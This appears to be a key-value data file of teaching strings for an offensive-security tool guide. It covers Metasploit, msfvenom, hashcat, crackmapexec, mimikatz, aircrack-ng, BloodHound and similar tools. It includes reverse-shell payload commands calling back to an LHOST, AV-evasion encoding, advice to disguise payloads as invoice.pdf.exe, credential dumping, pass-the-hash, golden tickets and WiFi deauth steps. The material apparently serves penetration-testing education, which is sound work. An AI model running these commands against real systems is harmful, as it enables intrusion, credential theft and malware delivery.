route.desc: Route MSF traffic through a Meterpreter session to reach internal networks.
route.teach: route add NETWORK/MASK SESSION_ID tells MSF to send all traffic for that network through your Meterpreter session. After routing, you can run ANY MSF module against the internal network through the pivot. This is how you compromise the entire internal network after one initial foothold.

set LHOST.label: set LHOST
set LHOST.teach: Your IP for reverse shell: set LHOST 192.168.1.50

output_read.meaning: successful exploit — you have a shell
exploit failed — check RHOSTS, LHOST, and payload

output_read.pattern: PAYLOAD => shows what shell will be sent — reverse_tcp
output_read.meaning: target calls back to you
Migration moves your shell into a stable process (migrate to explorer.exe)
Always set LHOST to your actual reachable IP, not localhost

metasploit.teach_alt: Exploitation framework — 2000+ modules covering exploit, post, auxiliary

hashcat.description: The world's fastest password recovery tool. GPU-accelerated cracking of MD5, SHA1, SHA256, bcrypt, NTLM, WPA2, and 300+ hash types. Can process billions of candidates per second on modern GPUs.
hashcat.teach_intro: Hashcat doesn't try to 'decrypt' hashes — it generates candidates and hashes them, comparing to your target. On a modern GPU it can try billions of passwords per second. The key is attack mode: dictionary (-a 0), combinator (-a 1), bruteforce (-a 3), rule-based (-a 0 with -r).

-m.label: Hash Type
-m.teach:
Always identify the hash type first. Use hash-identifier or hashid. Wrong -m = zero results. NTLM (1000) is Windows, MD5 (0) is common web apps.

Hash type: 1000=NTLM, 0=MD5, 1800=SHA512crypt, 13100=Kerberoast, 22000=WPA2

-a.label: Attack Mode
-a.teach:
Mode 0 (dictionary) with rockyou.txt cracks 60-80% of real-world hashes. Mode 3 (brute force) with masks covers the rest.

Attack mode: 0=dictionary, 3=brute force, 6=hybrid wordlist+mask

-r.label: Rule File
-r.desc: Apply transformation rules to wordlist: -r rules/best64.rule
-r.teach:
Rules transform words: password → P@ssw0rd!, admin → Admin123. best64.rule applies 64 transformations to every word — multiplies your coverage massively.

Rules file: -r /usr/share/hashcat/rules/best64.rule

--show.label: Show Cracked
--show.desc: Display previously cracked hashes from the potfile.
--show.teach:
Hashcat saves cracked passwords in ~/.hashcat/hashcat.potfile. --show retrieves them without cracking again.

Show cracked hashes from previous session

--wordlist.label: Wordlist
--wordlist.desc: Path to wordlist. rockyou.txt is default, seclists has many specialized lists.
--wordlist.teach: rockyou.txt (14M passwords) covers most. For targeted attacks, generate custom wordlists with CeWL from the target's website.

-O.label: Optimized Kernels
-O.desc: Enable optimized kernels — faster but limited to max 32 char passwords.
-O.teach: -O nearly doubles cracking speed. Most real passwords are under 32 chars so this is usually safe to use.

--increment.label: Brute Force Increment
--increment.desc: Start brute force from min length and increment up. Use with -a 3.
--increment.teach: ?a = all chars. Start with 4 chars and work up to 8. Catches short passwords first before long ones.

--status.label: Status Update
--status.desc: Show real-time status of cracking session.
--status.teach: Press 's' during cracking to get status. Shows speed, progress percentage, estimated time remaining.

output_read.meaning: cracked — check hashcat --show for the plaintext
wordlist finished with no crack — try rules or different wordlist
how fast — GPU >>> CPU for this
working, ETA shows estimated finish
Use -a 0 -r rules/best64.rule before brute force — catches 80% faster

hashcat.teach_alt: GPU-accelerated password hash cracker — fastest on the planet

john.description: Classic CPU-based password cracker. Auto-detects hash types, cracks /etc/shadow files, ZIP/RAR passwords, SSH key passphrases, Office documents. Where hashcat uses GPU power, John uses smart wordlist mangling and CPU efficiency.
john.teach_intro: John auto-detects hash formats and applies built-in mangling rules. It's slower than hashcat on simple hashes but excels at cracking files (ZIP, PDF, SSH keys) via its companion tools: zip2john, ssh2john, pdf2john. The workflow is: convert the file to a John-format hash, then crack it.

--wordlist.label: Wordlist Mode
--wordlist.teach: Most cracks happen here. rockyou.txt covers real-world passwords. John applies mangling rules on top automatically.

--format.label: Force Hash Format
--format.desc: Specify hash type when auto-detect fails: --format=NT, --format=sha512crypt, --format=bcrypt.
--format.teach: Auto-detect usually works. Force it when you know the hash type. Use 'john --list=formats' to see all supported types.

--rules.label: Mangling Rules
--rules.desc: Apply transformation rules to the wordlist.
--rules.teach: Rules transform: password → P@ssword1!, admin → @dm1n. John's built-in rules are aggressive and catch common substitutions.

--incremental.label: Brute Force Mode
--incremental.desc: Full character brute force. Slow but thorough.
--incremental.teach: Incremental tries all character combinations. Use as last resort — can take days for long passwords.

--show.label: Show Cracked
--show.desc: Display all cracked passwords from the session.
--show.teach: John saves cracked passwords in ~/.john/john.pot. --show reads them back without re-cracking.

--pot.label: Potfile Location
--pot.teach: Useful when sharing cracking sessions or keeping separate potfiles per engagement.

--fork.label: Multi-Process
--fork.desc: Run N parallel John processes on multi-core CPU.
--fork.teach: Use all CPU cores: --fork=4 for quad-core. Not as fast as GPU but great for file cracking where GPU can't help.

ffuf.description: Fuzz Faster U Fool — extremely fast web fuzzer written in Go. Used for directory brute forcing, parameter fuzzing, virtual host discovery, and API endpoint enumeration. Often faster than gobuster with more flexible filtering.
ffuf.teach_intro: FFUF replaces the keyword FUZZ in a URL/header/body with wordlist entries. It's incredibly versatile — fuzz directories, GET/POST parameters, headers, cookies, or anything. The filtering options (-fc, -fs, -fw, -fl) let you hide noise and surface only interesting responses.

-u.label: URL with FUZZ
-u.desc: Target URL. Place FUZZ where you want to inject wordlist entries.
-u.teach:
FUZZ is a placeholder. It can go anywhere in the URL: /FUZZ, /?param=FUZZ, in headers. Multiple FUZZ positions are possible.

URL with FUZZ keyword as injection point

-w.label: Wordlist
-w.desc: Wordlist file path. Use W1:FILE syntax for multiple wordlists.
-w.teach:
For dir fuzzing: dirb/common.txt (fast) or dirbuster/directory-list-2.3-medium.txt (thorough). For params: burp-parameter-names.txt from seclists.

Wordlist path

-fc.label: Filter Status Code
-fc.desc: Hide responses with specific HTTP status codes: -fc 404,400
-fc.teach:
Filter out 404s to see only valid paths. Add -fc 403 to hide forbidden too, or keep 403s — they mean the path exists.

Filter HTTP codes: -fc 404,500

-fs.label: Filter Size
-fs.desc: Hide responses of specific byte size: -fs 1234 (hides the 'not found' page size).
-fs.teach:
Most 'not found' pages are the same size. Find out the size of the 404 page with curl, then filter it out. Everything else is interesting.

Filter by response size: -fs 1234

-fw.label: Filter Word Count
-fw.desc: Hide responses with specific word count.
-fw.teach:
Alternative to -fs when the server varies 404 sizes. Word count is more stable than byte count for detecting real content.

Filter by word count

-mc.label: Match Status Code
-mc.desc: Only show responses with specific status codes: -mc 200,301,302,403
-mc.teach:
Whitelist approach vs blacklist (-fc). Only show what you care about. 200 = accessible, 301 = redirects, 403 = exists but forbidden.

Match HTTP codes: -mc 200,301,302,403

-t.label: Threads
-t.teach:
FFUF defaults to 40 threads which is already fast. -t 80+ on reliable servers. Reduce to 10 for rate-limited targets.

Threads: -t 50

-H.label: Custom Header
-H.desc: Add custom HTTP header: -H 'Host: FUZZ' for vhost fuzzing.
-H.teach:
Virtual host fuzzing! Change the Host header to discover hidden vhosts on the same IP. Internal apps often lurk here.

Add header: -H 'Cookie: session=abc'

-d.label: POST Data
-d.desc: Send POST request with fuzz point in body.
-d.teach:
POST body fuzzing finds parameter vulnerabilities. FUZZ in the username or password field can reveal SQLi, XSS, or logic flaws.

POST data: -d 'user=FUZZ&pass=password'

-o.label: Output File
-o.teach:
JSON output is parseable — pipe it into jq for filtering. HTML output is great for reports.

Output file: -o results.json

-recursion.label: Recursive Mode
-recursion.teach:
Recursion finds /admin/config/, /api/v1/users/ etc. Set -recursion-depth 2-3 to avoid infinite loops.

Recurse into found directories

-e.label: Extensions
-e.teach:
Extensions turn 'admin' into 'admin.php', 'admin.bak', 'admin.txt'. Backup files (.bak, .old, ~) are goldmines.

Extensions: -e .php,.html,.txt,.bak

-of.label: -of
-of.teach: Output format: json, csv, ecsv, md

output_read.meaning: High response size differences usually indicate real content
Filter noise first: run once, note the common response size, add -fs to hide it
403s are interesting — directory exists but is blocked
FUZZ can go anywhere in the URL — parameters, headers, paths
Use multiple wordlists by specifying -w multiple times with :FUZZ labels

ffuf.teach_alt: Fast web fuzzer — directory, parameter, header, and vhost discovery

burpsuite.description: The premier web application security testing platform. Intercepts, modifies, and replays HTTP/HTTPS traffic. Includes: Proxy, Repeater, Intruder (fuzzer), Scanner, Decoder, Sequencer, and Comparer. Used by nearly every professional web pen tester.
burpsuite.teach_intro: Burp Suite sits between your browser and the web server, capturing every request and response. You can pause requests, modify them, replay them, and send them to specialized tools. The Proxy tab shows live traffic. Repeater lets you modify and resend. Intruder automates fuzzing.

--project-file.label: Project File
--project-file.desc: Load/create a project file to save work between sessions.
--project-file.teach: Project files save all captured traffic, findings, and notes. Always create a project file for real engagements.

--config-file.label: Config File
--config-file.desc: Load Burp configuration from JSON file.
--config-file.teach: Config files let you pre-configure proxy settings, scope, and scan options. Great for consistent engagement setup.

Proxy.label: Intercept Mode
Proxy.desc: The core feature — intercept HTTP/HTTPS between browser and server.
Proxy.teach: Set your browser proxy to 127.0.0.1:8080. All traffic flows through Burp. Toggle Intercept to pause/modify requests before they reach the server.

Repeater.label: Repeater Tab
Repeater.desc: Modify and resend individual HTTP requests manually. Right-click any request → Send to Repeater.
Repeater.example: Right-click request → Send to Repeater → Modify → Send
Repeater.teach: Repeater is where you probe for vulnerabilities. Change parameter values, inject payloads, see exactly how the server responds. Manual testing at its finest.

Intruder.label: Intruder (Fuzzer)
Intruder.desc: Automated fuzzing/brute forcing. Mark payload positions with § symbols. Right-click → Send to Intruder.
Intruder.example: Send login request to Intruder, mark password field, set payload list, attack
Intruder.teach: Intruder attack types: Sniper (one position, one list), Battering Ram (same payload everywhere), Pitchfork (multiple lists in sync), Cluster Bomb (all combos).

Decoder.label: Decoder Tab
Decoder.desc: Encode/decode: Base64, URL, HTML, hex, gzip, JWT etc.
Decoder.example: Paste token → Decode as Base64 → Decode as URL → see plaintext
Decoder.teach: JWT tokens, session cookies, and hidden fields are often encoded. Decode them to find embedded data like user IDs, permissions, or expiry timestamps.

Comparer.label: Comparer Tab
Comparer.desc: Diff two requests or responses to spot differences.
Comparer.example: Send two responses to Comparer → compare word/byte differences
Comparer.teach: Compare successful vs failed login responses. Even tiny differences reveal logic flaws — different word counts, error messages, or response times.

nuclei.description: Fast, template-based vulnerability scanner. Runs thousands of community-maintained YAML templates against targets. Checks for CVEs, misconfigurations, exposed panels, default credentials, XSS, SQLi, SSRF, and more. ProjectDiscovery's flagship scanner.
nuclei.teach_intro: Nuclei uses YAML templates — each one describes how to detect a specific vulnerability. The community maintains 6000+ templates covering every CVE you can think of. It's the fastest way to scan for known vulnerabilities across a large number of targets.

-u.label: Single URL Target
-u.teach:
Single target mode. Nuclei runs all matching templates and reports findings with severity ratings.

Target URL

-l.label: Target List
-l.desc: File containing list of URLs to scan.
-l.teach:
Mass scanning — feed nuclei a list of URLs from subfinder/httpx output. Covers entire web attack surface at once.

List of targets: -l targets.txt

-t.label: Specific Template
-t.desc: Run a specific template or directory of templates.
-t.teach:
Run specific CVE templates for targeted testing. nuclei -t cves/ tests all CVE templates. nuclei -t exposures/ finds exposed sensitive data.

Template directory/file: -t http/cves/

-s.label: Severity Filter
-s.desc: Filter by severity: critical, high, medium, low, info.
-s.teach: Start with critical and high. Info templates generate a lot of noise. Focus on actionable findings first.

-tags.label: Tag Filter
-tags.teach:
Tags let you target specific vuln classes. -tags rce finds remote code execution opportunities. -tags default-login checks default credentials.

Filter by tags: -tags rce,sqli,xss,cve

-c.label: Concurrency
-c.desc: Number of parallel template executions. Default 25.
-c.teach:
Higher concurrency = faster scans. On stable targets use -c 50-100. Reduce for rate-limited or sensitive targets.

Concurrency: -c 25

-o.label: Output File
-o.teach:
Always save output. Nuclei findings with CVE numbers are ready-made report evidence.

Output file: -o nuclei_output.txt

-json.label: JSON Output
-json.desc: Output results in JSON format for parsing.
-json.teach: JSON output integrates with other tools and SIEM platforms. Each finding includes template name, severity, matched value, and URL.

-rl.label: Rate Limit
-rl.teach: Rate limiting prevents overwhelming the target and triggering WAF blocks. Use -rl 10-50 for sensitive production targets.

-headless.label: Headless Browser
-headless.desc: Enable headless Chrome for JavaScript-rendered targets.
-headless.teach: Single-page apps and React/Angular frontends need headless mode. Nuclei uses Chrome to render JS before scanning.

output_read.meaning: a confirmed critical vuln — exploit this first
[info] findings are not vulnerabilities — just enumeration (interesting files, tech stack)
Template ID tells you exactly what was found — google it for details
what specific string or condition triggered the match
False positives happen — verify critical/high findings manually

nuclei.teach_alt: Fast template-based vulnerability scanner with 6,000+ templates

subfinder.description: Passive subdomain discovery tool. Queries 40+ public data sources (Certificate Transparency, DNS databases, APIs, Shodan, VirusTotal) without sending any packets to the target. Completely passive OSINT recon.
subfinder.teach_intro: Subfinder finds subdomains without touching the target — it asks public databases. dev.target.com, staging.target.com, api.target.com, vpn.target.com — all potentially exposed and forgotten. Attack surface is almost always larger than the main domain suggests.

-d.label: Target Domain
-d.desc: Root domain to enumerate subdomains for.
-d.teach: Give subfinder the apex domain. It queries CT logs, VirusTotal, Shodan, and 40+ other sources. dev, staging, api subdomains frequently have weaker security.

-silent.label: Silent Mode
-silent.desc: Only output found subdomains. Perfect for piping into other tools.
-silent.teach: Silent mode is pipeline-ready. Output goes straight to httpx (check which are live) → then nuclei (scan each one).

-o.label: Output File
-o.teach: Save the list. Feed it to gobuster (dns mode), ffuf (vhost mode), httpx (aliveness check), then nuclei (scan all live ones).

-all.label: All Sources
-all.desc: Use all available data sources (requires API keys for some).
-all.teach: Without -all, subfinder uses free sources only. With API keys for Shodan, VirusTotal, Censys configured in ~/.config/subfinder/config.yaml, -all dramatically increases results.

-recursive.label: Recursive Discovery
-recursive.desc: Recursively find subdomains of discovered subdomains.
-recursive.teach: target.com → dev.target.com → db.dev.target.com. Deep recursion reveals internal-facing services accidentally exposed.

-t.label: Threads
-t.teach: More threads = faster enumeration across sources. Not limited by network since it's querying APIs, not the target.

amass.description: In-depth attack surface mapping and asset discovery by OWASP. Combines passive OSINT with active DNS enumeration, certificate transparency, ASN discovery, and network graph building. The most comprehensive subdomain/infrastructure recon tool available.
amass.teach_intro: AMASS doesn't just find subdomains — it maps the entire attack surface. It discovers ASNs, CIDRs, IP ranges, related domains, and builds a relationship graph of everything connected to the target. Use it when you need the deepest possible picture before an engagement.

enum.label: Enumerate Mode
enum.teach: enum mode does full enumeration. Add -passive for OSINT-only. Default includes active DNS queries.

intel.label: Intel Mode
intel.desc: Discover root domains, ASNs, and CIDRs owned by an organization.
intel.teach: Intel mode finds everything a company owns by searching WHOIS, ASN records, and netblocks. Gives you domains you didn't know to look for.

-d.label: Target Domain
-d.teach: Primary target domain. Amass will find subdomains, related domains, and connected infrastructure.

-passive.label: Passive Only
-passive.desc: Only use passive OSINT sources. Never touches the target directly.
-passive.teach: Passive mode is OPSEC-safe. Queries CT logs, Shodan, VirusTotal, ThreatCrowd. Zero packets to target.

-active.label: Active Enumeration
-active.desc: Include active DNS resolution, zone transfers, and brute forcing.
-active.teach: Active mode sends DNS queries and attempts zone transfers. Much more thorough but leaves traces in DNS server logs.

-brute.label: DNS Brute Force
-brute.desc: Brute force subdomains with a wordlist.
-brute.teach: Brute force finds subdomains not indexed in any public database. Pair with a good wordlist from seclists.

-o.label: Output File
-o.teach: Always save amass output — it includes IP addresses, ASNs, and relationships, not just hostnames.

-json.label: JSON Output
-json.desc: Save results in JSON format with relationship data.
-json.teach: JSON output preserves the graph relationships. Import into maltego or process with jq to extract specific data types.

enum4linux.description: SMB/NetBIOS enumeration tool for Windows and Samba systems. Extracts: usernames, groups, shares, policies, OS info, and domain data using null sessions and anonymous authentication. Essential for Active Directory recon.
enum4linux.teach_intro: Enum4linux queries Windows SMB (port 445) and NetBIOS (port 139) for information available without valid credentials. Null sessions and anonymous authentication often expose usernames, share lists, and domain information — all useful for building your attack plan against Windows environments.

-a.label: All Simple Checks
-a.desc: Run all simple enumeration checks. The go-to flag for initial SMB recon.
-a.teach:
-a runs everything: shares, users, groups, OS info, password policy. One flag gets you everything available without creds.

All enumeration (combines -U -S -G -P -r -o -n -i)

-U.label: Get Users
-U.teach:
RID cycling starts from RID 500 (Administrator) and increments, resolving each RID to a username. Lists all local and domain accounts.

Enumerate users via RPC

-S.label: Get Shares
-S.teach:
Lists all SMB shares. SYSVOL and NETLOGON are standard AD shares. C$, ADMIN$ require admin rights. Look for unusual shares with sensitive data.

Enumerate shares

-P.label: Get Password Policy
-P.teach:
Password policy reveals: min length, lockout threshold, lockout duration. Guides your brute force strategy — stay under the lockout count!

Get password policy (min length, lockout threshold)

-G.label: Get Groups
-G.teach:
Group membership reveals privilege structure. Who's in Domain Admins? Who's in Remote Desktop Users? Maps your escalation path.

Enumerate groups

-u.label: Username
-u.teach:
Authenticated enum returns much more data. If you have any valid credentials (even low-priv), always use them.

Authentication: -u admin -p password

-p.label: Password
-p.teach: Combined with -u. Even guest/guest or domain\user:password works for expanded enumeration.

-r.label: -r
-r.teach: RID cycling (brute force user IDs to discover accounts)

output_read.meaning: discovered user account — add to your list
accessible share — mount it: smbclient //target/share
can enumerate without credentials (misconfiguration)
how strong to make brute force attempts
structure — interesting for AD attacks

enum4linux.teach_alt: SMB/NetBIOS enumeration — dumps users, shares, groups, password policy

crackmapexec.description: Swiss Army knife for Windows/Active Directory post-exploitation and lateral movement. Tests credentials across entire subnets, dumps hashes, executes commands, deploys agents, and maps AD environments. Competes directly with Cobalt Strike for post-access operations.
crackmapexec.teach_intro: CME automates what would take hours manually in AD environments. Give it a subnet and credentials — it tests every host, shows which ones you can admin, and lets you dump SAM/NTDS hashes, execute commands, or spider shares across the entire domain in minutes.

smb.label: SMB Protocol
smb.desc: Target Windows SMB (the most common usage).
smb.teach:
SMB mode tests credentials and executes against Windows hosts. A green [+] means success. Red [-] means denied. Pwn3d! means you're a local admin.

SMB protocol (most common for AD)

winrm.label: WinRM Protocol
winrm.teach:
WinRM gives you PowerShell remoting. If SMB works and WinRM is open, you can drop into an interactive PS session.

Windows Remote Management

ldap.label: LDAP Protocol
ldap.teach: LDAP against the DC dumps users, groups, GPOs, and trusts. --bloodhound exports data for BloodHound graph analysis.

-u.label: Username
-u.teach:
Single username for targeted sprays. Use a file for mass testing: -u users.txt. Always respect lockout policies!

Username or file: -u users.txt

-p.label: Password
-p.teach:
Combined with -u. For spraying: single password against many users. For dumping: use cracked password to authenticate.

Password or file: -p passwords.txt

-H.label: NT Hash (Pass the Hash)
-H.desc: Use NT hash instead of password for authentication.
-H.teach:
Pass the Hash doesn't need the plaintext password — just the NTLM hash. Dump hashes from one machine, pass them to access others. Classic lateral movement.

NTLM hash (pass-the-hash): -H aad3b435b51404eeaad3b435b51404ee:hash

--sam.label: Dump SAM Hashes
--sam.desc: Dump local SAM database (requires local admin).
--sam.teach:
SAM contains local account hashes. Administrator hash often reused across machines. Crack with hashcat or pass-the-hash directly.

Dump SAM database (local accounts)

--ntds.label: Dump NTDS (DC Only)
--ntds.desc: Dump the entire Active Directory database from a Domain Controller.
--ntds.teach:
NTDS.dit is the crown jewel — every domain account hash in one dump. Domain compromise means cracking every user's password.

Dump Active Directory database

--shares.label: Enumerate Shares
--shares.desc: List all accessible shares on target(s).
--shares.teach:
Maps readable shares across the network. Find: finance folders, HR data, passwords.xlsx, backup files. Lateral movement goldmine.

Enumerate accessible SMB shares

-x.label: Execute Command
-x.desc: Execute a shell command on target(s).
-x.teach:
-x runs the command via SMBExec. -X runs PowerShell commands. Start with 'whoami /priv' to see your privileges.

Execute command: -x 'whoami'

--bloodhound.label: BloodHound Collection
--bloodhound.desc: Collect AD data for BloodHound graph analysis.
--bloodhound.example: crackmapexec ldap dc01.domain.com -u user -p password --bloodhound -ns 192.168.1.1 --collection All
--bloodhound.teach: BloodHound data reveals shortest path to Domain Admin. Visual attack path mapping — indispensable for complex AD environments.

output_read.meaning: success — credentials work on this host
you have admin access — this is the big one
informational
failed
wrong creds
account locked — stop immediately

crackmapexec.teach_alt: Swiss army knife for Active Directory pentesting and lateral movement

msfvenom.description: Metasploit's payload generator and encoder. Creates shellcode, executables, scripts, and APKs in any format for any platform. Combines msfpayload and msfencode into a single tool. Used for creating reverse shells, bind shells, and staged/stageless payloads.
msfvenom.teach_intro: MSFvenom generates the malicious payload that runs on the victim after exploitation. Think of it as a payload factory: you choose what it does (reverse shell, bind shell, exec), what format (exe, elf, py, php, apk), and what architecture (x86, x64, ARM). The output goes on the victim, MSF multi/handler catches the connection.
msfvenom.default_command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={target} LPORT=4444 -f exe -o payload.exe

-p.label: Payload
-p.teach: Payload naming: OS/arch/type/connection. reverse_tcp calls back to you. bind_tcp opens a port on victim. Staged (/) downloads shellcode. Stageless (_) is self-contained.

-f.label: Output Format
-f.desc: Format: exe, elf, py, php, asp, aspx, rb, sh, apk, raw, c, dll.
-f.example: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe -o payload.exe
-f.teach: Match format to the target environment. PHP payload for web servers. ELF for Linux binaries. APK for Android. EXE for Windows.

-e.label: Encoder
-e.desc: Encode payload to avoid signature detection: -e x86/shikata_ga_nai
-e.example: msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe
-e.teach: Encoding transforms shellcode to evade AV signatures. -i 5 encodes 5 times. shikata_ga_nai is the classic encoder but most AV catches it now. Real evasion needs custom packers.

-i.label: Encoding Iterations
-i.example: msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe
-i.teach: More iterations = more obfuscation. But each iteration increases file size and many AV detect the encoding wrapper itself.

-o.label: Output File
-o.teach: Always specify -o. Otherwise msfvenom outputs raw bytes to stdout. Name the file something believable: update.exe, setup.exe, invoice.pdf.exe.

-a.label: Architecture
-a.desc: Target architecture: x86, x64, arm, mipsle.
-a.example: msfvenom -p linux/arm/shell_reverse_tcp -a arm LHOST=10.10.10.1 LPORT=4444 -f elf
-a.teach: Wrong arch = payload won't execute. Check with 'file <binary>' on the target system. ARM for Raspberry Pi, IoT devices, Android.

--platform.label: Target Platform
--platform.desc: Target OS: windows, linux, osx, android, php, python, java.
--platform.example: msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe
--platform.teach: Platform determines which payload options are available. Usually auto-detected from the payload name.

-l payloads.label: List Payloads
-l payloads.desc: List all available payloads filtered by string.
-l payloads.teach: Hundreds of payload options. grep for your OS: msfvenom -l payloads | grep 'linux/x64' | grep 'shell'

aircrack-ng.description: The complete WiFi security auditing suite. Captures WPA2 handshakes, performs deauth attacks to force reconnections, cracks WEP/WPA/WPA2 passphrases, and monitors wireless traffic. The foundation of all WiFi security testing.
aircrack-ng.teach_intro: WiFi attacks follow a pattern: put your adapter in monitor mode → capture traffic → capture the 4-way handshake (force it with deauth) → crack the handshake offline with a wordlist. The handshake contains enough info to verify passwords without connecting to the AP.

-w.label: Wordlist
-w.teach: WPA2 cracking is a dictionary attack against the 4-way handshake. rockyou.txt covers common passphrases. Corporate networks often use complex passphrases — try specialized WiFi wordlists.

-b.label: Target BSSID
-b.desc: Filter by specific access point MAC address.
-b.teach: When your capture file has multiple APs, -b specifies which one to crack. Get the BSSID from airodump-ng output.

-e.label: Target ESSID
-e.teach: Alternative to -b. Use the network name if you don't have the BSSID.

airmon-ng.label: Monitor Mode
airmon-ng.desc: Enable/disable monitor mode on WiFi adapter.
airmon-ng.teach: Monitor mode lets your adapter see ALL WiFi frames, not just those addressed to it. Required step before any WiFi attack. Your interface becomes wlan0mon.

airodump-ng.label: Capture Traffic
airodump-ng.desc: Capture WiFi packets and discover networks.
airodump-ng.teach: Shows all APs in range with BSSID, channel, encryption, and connected clients. Focus on a target: airodump-ng -c [channel] --bssid [AP MAC] -w capture wlan0mon

aireplay-ng.label: Inject Packets / Deauth
aireplay-ng.desc: Inject packets including deauth attacks to force handshake capture.
aireplay-ng.teach: Deauth kicks the client off the network. When they reconnect, you capture the 4-way handshake. --deauth 0 runs continuously. Use -c to target a specific client.

hcxtools.label: PMKID Attack
hcxtools.desc: Capture PMKID without waiting for a client handshake.
hcxtools.example: hcxdumptool -i wlan0mon -o pmkid.pcapng && hcxpcapngtool pmkid.pcapng -o hash.txt && hashcat -m 22000 hash.txt rockyou.txt
hcxtools.teach: PMKID attack captures just from the beacon — no client needed! Convert capture to hashcat format 22000 for cracking. Faster than waiting for deauth handshake.

wireshark.description: The world's most widely used network protocol analyzer. Captures and dissects live network traffic or analyzes saved PCAP files. Decodes 2000+ protocols including HTTP, DNS, SMB, TLS (with keys), SSH metadata, and more. Essential for incident response and network forensics.
wireshark.teach_intro: Wireshark sees every packet on the network. HTTP traffic is fully readable — usernames, passwords, session tokens all visible in plaintext. Even encrypted traffic reveals connection patterns, timing, and metadata. For forensics, a PCAP file is a complete record of everything that happened on the network.

-i.label: Interface
-i.desc: Capture on a specific network interface.
-i.teach: Specify the interface to capture on. Use 'ip link show' to list interfaces. wlan0 for WiFi, eth0 for Ethernet, lo for loopback.

-r.label: Read PCAP File
-r.desc: Open an existing packet capture file.
-r.teach: PCAP files are recordings of network traffic. Open them to analyze after the fact — incidents, CTF challenges, or saved captures.

-f.label: Capture Filter
-f.desc: BPF syntax filter applied during capture: 'host 192.168.1.1' or 'port 80'
-f.teach: Capture filters (BPF syntax) filter before writing to disk. Display filters (in the GUI) filter after capture. Always use capture filters on high-traffic networks.

-Y.label: Display Filter
-Y.teach: Display filters let you find specific traffic. 'http.request' shows all HTTP requests. 'dns' shows all DNS. 'smb2' shows SMB. 'frame contains password' searches all packets for the word password.

tshark.label: TShark (CLI)
tshark.desc: Command-line version of Wireshark. Perfect for scripting and remote captures.
tshark.teach: TShark is Wireshark without the GUI. Use it on headless servers, in scripts, or over SSH. tshark -r file.pcap -T fields -e http.request.uri extracts all HTTP URLs.

mimikatz.description: Windows credential extraction tool. Dumps plaintext passwords, NTLM hashes, Kerberos tickets, and certificates from Windows memory (LSASS). The most dangerous credential tool in existence — runs after gaining admin access.
mimikatz.teach_intro: Mimikatz reads from LSASS (Local Security Authority Subsystem Service), the Windows process that manages authentication. When users log in, LSASS caches their credentials in memory for convenience. Mimikatz extracts them — often including plaintext passwords for recently logged-in users.

sekurlsa::logonpasswords.label: Dump Logon Passwords
sekurlsa::logonpasswords.desc: Extract plaintext passwords and NTLM hashes from LSASS memory.
sekurlsa::logonpasswords.teach: The holy grail. Shows all currently cached credentials: username, domain, NTLM hash, and sometimes plaintext password. Requires SYSTEM or local admin.

sekurlsa::wdigest.label: WDigest Credentials
sekurlsa::wdigest.desc: Show plaintext passwords cached by the WDigest protocol.
sekurlsa::wdigest.teach: WDigest caches plaintext passwords for legacy SSO. Disabled in Win8.1+ but can be re-enabled via registry. Legacy servers still have it on.

sekurlsa::tickets.label: Kerberos Tickets
sekurlsa::tickets.desc: List and export Kerberos tickets from memory.
sekurlsa::tickets.teach: Kerberos tickets let you authenticate without a password. Exported .kirbi files can be used with Pass the Ticket attacks or Kerberoasting.

lsadump::sam.label: SAM Database
lsadump::sam.desc: Dump local account hashes from the SAM database.
lsadump::sam.teach: SAM holds local account hashes. Requires SYSTEM. Hashes are in NTLM format — crack with hashcat or pass directly.

lsadump::dcsync.label: DCSync Attack
lsadump::dcsync.desc: Impersonate a DC and request password hashes via replication protocol.
lsadump::dcsync.teach: DCSync doesn't touch LSASS — it uses replication protocols to request hashes from the DC. Stealthier than running on the DC itself. Requires DA or replication rights.

kerberos::golden.label: Golden Ticket
kerberos::golden.desc: Forge a Kerberos ticket granting ticket (TGT) using the KRBTGT hash.
kerberos::golden.teach: Golden Ticket is god-mode in AD. With the KRBTGT hash you create valid Kerberos tickets for ANY user including non-existent ones — works for 10 years. Full domain persistence.

privilege::debug.label: Enable Debug Privilege
privilege::debug.desc: Required before accessing LSASS. Run first.
privilege::debug.teach: Debug privilege allows reading other process memory including LSASS. Always run this first or credential extraction commands will fail.

token::elevate.label: Token Impersonation
token::elevate.desc: Impersonate SYSTEM token for higher privileges.
token::elevate.teach: Elevates to SYSTEM even if running as admin. SYSTEM has more rights than admin on Windows. Required for some credential operations.

bloodhound.description: Active Directory attack path mapping tool. Collects AD relationships and visualizes them as a graph, showing the shortest paths from any compromised account to Domain Admin. Reveals privilege escalation paths that would take days to find manually.
bloodhound.teach_intro: BloodHound thinks of Active Directory as a graph where users, groups, computers, and GPOs are nodes connected by edges (relationships). It finds attack paths like: you own user A → user A is local admin on computer B → computer C's admin is logged into B → C's admin is in Domain Admins. Each hop is a lateral movement opportunity.

SharpHound.label: Data Collector (Windows)
SharpHound.desc: Windows collector that gathers AD data. Run as domain user.
SharpHound.teach: SharpHound collects from Windows. -c All gathers everything: sessions, ACLs, trusts, GPOs. Output is a zip of JSON files you import into BloodHound.

bloodhound-python.label: Python Collector (Linux)
bloodhound-python.desc: Linux-based collector. Run from Kali with domain credentials.
bloodhound-python.teach: Linux collector — no need to run anything on Windows. Requires valid domain credentials. -c All collects sessions, ACLs, trusts. Import the resulting JSON files into BloodHound.

-c All.label: Collect Everything
-c All.desc: Collect all data types: Session, ACL, ObjectProps, Trusts, LocalAdmin, RDP, DCOM, PSRemote.
-c All.teach:
All collection methods give you the most complete graph. Session data shows which users are logged into which computers right now — critical for finding paths.

Collect everything (Users, Groups, Sessions, ACLs, Trusts)

Find Shortest Paths to DA.label: Attack Path to DA
Find Shortest Paths to DA.desc: Built-in BloodHound query: find paths from owned nodes to Domain Admins.
Find Shortest Paths to DA.example: In BloodHound GUI: Analysis → Find Shortest Paths to Domain Admins
Find Shortest Paths to DA.teach: The killer feature. Mark your compromised accounts as Owned, then run this query. BloodHound shows every attack path. Focus on paths with the fewest hops.

Kerberoastable Accounts.label: Find Kerberoastable Users
Kerberoastable Accounts.desc: Find service accounts with SPNs that can be Kerberoasted.
